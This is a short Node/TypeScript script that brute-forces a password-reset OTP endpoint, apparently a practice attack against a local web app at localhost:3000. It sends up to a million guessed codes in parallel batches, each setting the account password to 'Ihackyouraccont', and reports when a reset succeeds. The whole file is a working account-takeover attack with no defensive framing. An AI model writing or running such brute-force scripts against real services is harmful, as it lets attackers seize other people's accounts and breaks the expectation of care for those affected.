const axios = require('axios');

async function sendRequest (otp:string) {
  let data = JSON.stringify({
    "email": "email", // put email here
    "otp": otp,
    "newPassword": "Ihackyouraccont"
  });

  let config = {
    method: 'post',
    maxBodyLength: Infinity,
    url: 'http://localhost:3000/verify-otp',
    headers: { 
      'authorization': '', 
      'Content-Type': 'application/json'
    },
    data : data
  };
  
  return axios.request(config)
  
}


async function main() {
  for(let i=0; i<1000000; i+=500) {
    console.log(i);
    let promisses = [];
    for(let j=i; j<500+i; j++) {
      promisses.push(sendRequest(j.toString()). then(res => {
        if(res.data.success) {
          console.log("Password reset succesfully")
          return
        }
      }).catch(e => {}))
      await Promise.all(promisses);    
    }
    
  }
}


main();



